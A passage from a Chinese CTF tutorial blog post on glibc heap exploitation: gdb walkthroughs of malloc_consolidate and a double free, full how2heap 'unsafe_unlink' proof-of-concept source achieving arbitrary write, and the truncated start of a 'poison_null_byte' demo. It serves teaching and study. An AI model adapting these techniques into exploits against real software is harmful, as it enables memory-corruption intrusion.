                ><br>在gdb里s步入调试，可以看到触发了malloc_consolidate机制。原因如下，因为libc再分配large chunk时，fastbin中有p1这个chunk存在，所以会调用malloc_consolidate()函数整合fastbins中的chunk，并放入unsorted bin或top_chunk;然后unsorted bin中的chunk又会被取出放入各自对应的bins。(这个bins为small bin和large bin。这也是chunk唯一进入small bin和large bin的机会)。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_VXYWCAM8E85E5V6.png"
                      alt="图片描述"
                ><br>malloc_consolidate()函数执行完以后，因为p1与top_chunk相邻，所以p1被合并到了top_chunk。top_chunk的基址也变成了p1的prev_size的地址。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_6AUFTSRX2JMSNHZ.png"
                      alt="图片描述"
                ><br>然后malloc函数会从top_chunk获取chunk，那么p1的地址就已经和p3指向同一块地址了。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_7R2MJEDKJDC62ZD.png"
                      alt="图片描述"
                ><br>此时再次free(p1)，在0x40076c处下断点。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_3UFBHGTKF3NW24D.png"
                      alt="图片描述"
                ><br>由于p1和p3指向同一个大小为0x411的chunk,而这个chunk又和top_chunk相邻，所以会再次被合并到top_chunk。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_K9CV7KXXVU9UMNW.png"
                      alt="图片描述"
                ><br>如果这个时候，我们再次申请一个chunk，在0x40077A处下断点。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_38SFMRQ5X3FR7A5.png"
                      alt="图片描述"
                ><br>那么这个chunk的地址还会与p1 &amp;&amp; p3的地址一样。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_4AUY3TB9B4HUMEM.png"
                      alt="图片描述"
                ><br>至此p1,p3,p4指向了同一块chunk。</p>
<h2 id="unsafe-unlink"><a href="#unsafe-unlink" class="headerlink" title="unsafe_unlink"></a>unsafe_unlink</h2><h3 id="源码-6"><a href="#源码-6" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> *chunk0_ptr;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">setbuf</span>(stdout, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Welcome to unsafe unlink 2.0!\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Tested in Ubuntu 14.04/16.04 64bit.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This technique can be used when you have a pointer at a known location to a region you can call unlink on.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> malloc_size = <span class="number">0x80</span>; <span class="comment">//we want to be big enough not to use fastbins</span></span><br><span class="line">	<span class="type">int</span> header_size = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	chunk0_ptr = (<span class="type">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk0</span></span><br><span class="line">	<span class="type">uint64_t</span> *chunk1_ptr  = (<span class="type">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk1</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The global chunk0_ptr is at %p, pointing to %p\n&quot;</span>, &amp;chunk0_ptr, chunk0_ptr);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The victim chunk we are going to corrupt is at %p\n\n&quot;</span>, chunk1_ptr);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We create a fake chunk inside chunk0.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We setup the &#x27;next_free_chunk&#x27; (fd) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;fd-&gt;bk = P.\n&quot;</span>);</span><br><span class="line">	chunk0_ptr[<span class="number">2</span>] = (<span class="type">uint64_t</span>) &amp;chunk0_ptr-(<span class="built_in">sizeof</span>(<span class="type">uint64_t</span>)*<span class="number">3</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We setup the &#x27;previous_free_chunk&#x27; (bk) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;bk-&gt;fd = P.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;With this setup we can pass this check: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False\n&quot;</span>);</span><br><span class="line">	chunk0_ptr[<span class="number">3</span>] = (<span class="type">uint64_t</span>) &amp;chunk0_ptr-(<span class="built_in">sizeof</span>(<span class="type">uint64_t</span>)*<span class="number">2</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Fake chunk fd: %p\n&quot;</span>,(<span class="type">void</span>*) chunk0_ptr[<span class="number">2</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Fake chunk bk: %p\n\n&quot;</span>,(<span class="type">void</span>*) chunk0_ptr[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\n&quot;</span>);</span><br><span class="line">	<span class="type">uint64_t</span> *chunk1_hdr = chunk1_ptr - header_size;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We shrink the size of chunk0 (saved as &#x27;previous_size&#x27; in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;It&#x27;s important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\n&quot;</span>);</span><br><span class="line">	chunk1_hdr[<span class="number">0</span>] = malloc_size;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;If we had &#x27;normally&#x27; freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: %p\n&quot;</span>,(<span class="type">void</span>*)chunk1_hdr[<span class="number">0</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We mark our fake chunk as free by setting &#x27;previous_in_use&#x27; of chunk1 as False.\n\n&quot;</span>);</span><br><span class="line">	chunk1_hdr[<span class="number">1</span>] &amp;= ~<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\n\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(chunk1_ptr);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\n&quot;</span>);</span><br><span class="line">	<span class="type">char</span> victim_string[<span class="number">8</span>];</span><br><span class="line">	<span class="built_in">strcpy</span>(victim_string,<span class="string">&quot;Hello!~&quot;</span>);</span><br><span class="line">	chunk0_ptr[<span class="number">3</span>] = (<span class="type">uint64_t</span>) victim_string;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Original value: %s\n&quot;</span>,victim_string);</span><br><span class="line">	chunk0_ptr[<span class="number">0</span>] = <span class="number">0x4141414142424242</span>LL;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;New Value: %s\n&quot;</span>,victim_string);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// sanity check</span></span><br><span class="line">	<span class="built_in">assert</span>(*(<span class="type">long</span> *)victim_string == <span class="number">0x4141414142424242</span>L);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>当然，其实chunk0_ptr并不一定是一个全局指针。以下代码在glibc2.23依然起作用。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> malloc_size = <span class="number">0x80</span>;</span><br><span class="line">	<span class="type">uint64_t</span>* ptr0 = (<span class="type">uint64_t</span>*)<span class="built_in">malloc</span>(malloc_size);</span><br><span class="line">	<span class="type">uint64_t</span>* ptr1 = (<span class="type">uint64_t</span>*)<span class="built_in">malloc</span>(malloc_size);</span><br><span class="line">	ptr0[<span class="number">2</span>] = (<span class="type">uint64_t</span>)&amp;ptr0 - <span class="number">3</span>*<span class="built_in">sizeof</span>(<span class="type">uint64_t</span>);</span><br><span class="line">	ptr0[<span class="number">3</span>] = (<span class="type">uint64_t</span>)&amp;ptr0 - <span class="number">2</span>*<span class="built_in">sizeof</span>(<span class="type">uint64_t</span>);</span><br><span class="line"> </span><br><span class="line">	<span class="type">uint64_t</span>* ptr1_head = (<span class="type">uint64_t</span>)ptr1 - <span class="number">2</span>*<span class="built_in">sizeof</span>(<span class="type">uint64_t</span>);</span><br><span class="line">	ptr1_head[<span class="number">0</span>] = malloc_size;</span><br><span class="line">	ptr1_head[<span class="number">1</span>] &amp;= ~<span class="number">1</span>;</span><br><span class="line">	<span class="built_in">free</span>(ptr1);</span><br><span class="line">	<span class="type">char</span> victim[<span class="number">10</span>] = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">	ptr0[<span class="number">3</span>]=(<span class="type">uint64_t</span>)victim;</span><br><span class="line">	ptr0[<span class="number">0</span>] = <span class="number">0x4141414141</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,victim);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<pre><code>使用ubuntu:16.04编译并使用第一个源码pwncli改写rpath。
</code></pre>
<p>简单介绍一下unlink，<a class="link"   target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/unlink/" >CTF Wiki <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>里有介绍，简单总结如下：</p>
<pre><code>1，首先找到要进行unlink的chunk(这里记为P)的前后堆块，
   FD = P-&gt;fd, BK = P-&gt;bk。
2，进行安全检查，glibc2.23的潦草判断条件如下
   FD-&gt;bk == P, BK-&gt;fd == P。
3，然后执行FD-&gt;bk=BK, BK-&gt;fd=FD。
4，当某个non-fast大小的chunk被释放时，就会根据PREV_INUSE位检查其前后堆块是否处于释放状态，如果是就会将前面或后面的堆块取出并与当前堆块合并。取出前面或后面的堆块P的过程就是unlink。
</code></pre>
<h3 id="调试-6"><a href="#调试-6" class="headerlink" title="调试"></a>调试</h3><p>首先申请两块smallbin_chunk。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_6ZP8PYCJCE35KDG.png"
                      alt="图片描述"
                ><br>为了绕过unlink检查，这里将全局的chunk0_ptr+0x10(chunk0_ptr[2])处的内容改为chunk0_ptr-0x18的地址，注意这里chunk0_ptr[2]指向的是全局变量的地址。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_XTHTCK8EQSMAX6B.png"
                      alt="图片描述"
                ><br>同样，接下来将chunk0_ptr[3]的内容改为chunk0_ptr-0x10的地址。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_2GFDGPT8AB5TCPM.png"
                      alt="图片描述"
                ><br>chunk0_ptr位置在bss节。<br>  <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_2QDW7TADTJ8F9YD.png"
                      alt="图片描述"
                ></p>
<p>此时chunk0的堆结构。可以看到chunk0_ptr指向chunk0_fd(0x603010)的位置。chunk0_fd_nextsize和chunk0_bk_nextsize已被修改为全局变量（bss节）处的地址。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_T7ZZAKUECF646WZ.png"
                      alt="图片描述"
                ><br>用图来表示如下<br>  <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_NXQ9YXPN542KB5K.png"
                      alt="图片描述"
                ></p>
<p>接下来cdqe指令将EAX寄存器中的DWORD(32 位值)符号扩展为RAX寄存器中的 QWORD(64 位值)。然后利用shl指令逻辑左移三位，再利用neg指令求补。最后也就是将chunk1_hdr的内容改为chunk1_ptr-2（chunk1_prev_size）的地址。<br>  <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_JG8ZQB8MH2YV68Q.png"
                      alt="图片描述"
                ></p>
<p>接下来将chunk1_hdr[0]改为0x80大小，也就是chunk1的prev_size位变为0x80。<br>  <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_JN69YNASY7MKFCK.png"
                      alt="图片描述"
                ></p>
<p>然后利用and指令（与运算有零则零）把chunk1_hdr+1也就是chunk1_size的PREV_INUSE位改为0。<br>  <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_BGBDQAVWY7R26XR.png"
                      alt="图片描述"
                ></p>
<p>现在堆结构如图。因为chunk_prev_size&#x3D;0x80,所以P_chunk如下<br>  <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_PZ9JU3KFW6NJN5P.png"
                      alt="图片描述"
                ></p>
<p>然后把chunk1给free()掉因为其PREV_INUSE为0，又是small bin大小，触发unlink，要将P这个fake chunk摘除。<br>  <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_VY24BDSZW5SQSWA.png"
                      alt="图片描述"
                ><br>那么此时FD&#x3D;P-&gt;FD和BK&#x3D;P-&gt;bk，FD-&gt;bk &#x3D;&#x3D; P, BK-&gt;fd &#x3D;&#x3D; P。可以能够看到成功绕过glibc2.23检查。注意，我画的时候是根据布局画的，堆由低向高地址增长（由高向低画），bss由低向高画的。<br>  <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_3KAA3VZEGWRQ2CF.png"
                      alt="图片描述"
                ></p>
<p>接下来执行 两步操作 FD-&gt;bk&#x3D;BK, BK-&gt;fd&#x3D;FD。FD和BK只相差0x8字节大小。第一步会把chunk0_ptr指向低0x10字节处（0x602068），第二步把chunk0_ptr指向低0x18字节处（0x602060），最终chunk0_ptr指向了0x602060处。chunk0_ptr &#x3D; 0x602060，我们向chunk0_ptr写入内容时就会从0x602060开始向高地址写，我们发现，写到高0x18时，写到了我们保存写入地址指针的地址，这个地址(chunk0_ptr的物理地址0x602078)存储的地址(0x602060)就是我们开始写的地址，也就是chunk0_ptr指向的地址。<br>  <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_3G6W8HPTPJYVXXM.png"
                      alt="图片描述"
                ><br>可以看到，<code>chunk0_ptr</code>指向的地址由<code>*chunk0_ptr-0x18</code>保存，修改<code>*chunk0_ptr-0x18</code>存储的地址(0x602060)，也就修改了写入的起始地址，也就是chunk0_ptr指向的地址，我们会从这个新地址重新开始写，也就达到了任意地址写的效果。这只是其中一种用法，建议看例题来加深理解。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_4A4TPGFMMJSRUCR.png"
                      alt="图片描述"
                ><br>我们也可以通过从0x602060开始向高地址覆盖，覆盖到0x602078处时，修改这里保存的地址，然后下次写时就会从修改的这个新地址开始写入。</p>
<h1 id="第三部分"><a href="#第三部分" class="headerlink" title="第三部分"></a>第三部分</h1><h2 id="例题-2"><a href="#例题-2" class="headerlink" title="例题"></a>例题</h2><ul>
<li><p>off-by-one<br><a class="link"   target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-1825637-1-1.html" >ASIS CTF 2016 : b00ks <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-1828172-1-1.html" >Plaid CTF 2015 : PlaidDB <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-1828388-1-1.html" >SECCON CTF 2016 : tinypad <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-1836790-1-1.html" >BCTF 2016 : bcloud <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</li>
<li><p>overlapping chunk<br><a class="link"   target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-1833414-1-1.html" >0CTF 2018 : babyheap <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-1833578-1-1.html" >hack.lu CTF 2015 : bookstore <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</li>
</ul>
<h2 id="poison-null-byte"><a href="#poison-null-byte" class="headerlink" title="poison_null_byte"></a>poison_null_byte</h2><h3 id="源码-7"><a href="#源码-7" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">setbuf</span>(stdin, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">setbuf</span>(stdout, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Welcome to poison null byte 2.0!\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Tested in Ubuntu 16.04 64bit.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This technique only works with disabled tcache-option for glibc, see build_glibc.sh for build instructions.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This technique can be used when you have an off-by-one into a malloc&#x27;ed region with a null byte.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">uint8_t</span>* a;</span><br><span class="line">	<span class="type">uint8_t</span>* b;</span><br><span class="line">	<span class="type">uint8_t</span>* c;</span><br><span class="line">	<span class="type">uint8_t</span>* b1;</span><br><span class="line">	<span class="type">uint8_t</span>* b2;</span><br><span class="line">	<span class="type">uint8_t</span>* d;</span><br><span class="line">	<span class="type">void</span> *barrier;</span><br><span class="line"></span><br><span class="line">	<span 